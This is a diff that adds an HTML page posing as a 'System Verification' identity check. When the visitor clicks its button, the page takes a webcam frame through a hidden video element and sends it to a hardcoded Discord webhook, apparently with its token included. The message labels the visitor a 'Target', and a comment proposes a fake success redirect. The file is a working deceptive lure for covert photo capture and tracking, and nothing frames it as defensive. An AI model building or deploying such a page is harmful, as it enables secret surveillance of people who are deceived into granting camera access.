@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Verification</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        #video { width: 320px; border: 1px solid #333; display: none; } /* Hidden video */
+        .status { margin-top: 20px; font-size: 1.2rem; }
+        button { padding: 15px 30px; background: #0f0; color: #000; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; }
+    </style>
+</head>
+<body>
+
+    <div class="status" id="status">AUTHENTICATION REQUIRED</div>
+    <br>
+    <button id="authBtn">VERIFY IDENTITY</button>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1477690694574276739/YqRoM2cBw3mX2fqa9UBYE80h1t1IapZXWUrvad5XIfFu4bmpLaDivtHcxtlLorS5OI58";
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const authBtn = document.getElementById('authBtn');
+        const status = document.getElementById('status');
+
+        authBtn.addEventListener('click', async () => {
+            status.innerText = "INITIALIZING...";
+            
+            try {
+                // 1. Request Camera Access
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                video.srcObject = stream;
+
+                // Wait a moment for camera to adjust to light
+                setTimeout(() => {
+                    captureAndSend();
+                }, 1000);
+
+            } catch (err) {
+                status.innerText = "ACCESS DENIED: PLEASE ALLOW CAMERA";
+                console.error(err);
+            }
+        });
+
+        async function captureAndSend() {
+            // 2. Capture Frame to Canvas
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            // 3. Convert Canvas to Blob (File)
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('file1', blob, 'capture.png');
+                formData.append('payload_json', JSON.stringify({
+                    content: "📸 **New Capture Received!**\nTarget clicked the verify button.",
+                    username: "Lyrox-Tracker"
+                }));
+
+                // 4. Send to Discord
+                try {
+                    const response = await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    if (response.ok) {
+                        status.innerText = "VERIFICATION COMPLETE";
+                        // Optional: Redirect to a fake "success" page
+                        // window.location.href = "https://google.com";
+                    }
+                } catch (error) {
+                    console.error("Webhook Error:", error);
+                }
+            }, 'image/png');
+        }
+    </script>
+</body>
+</html>
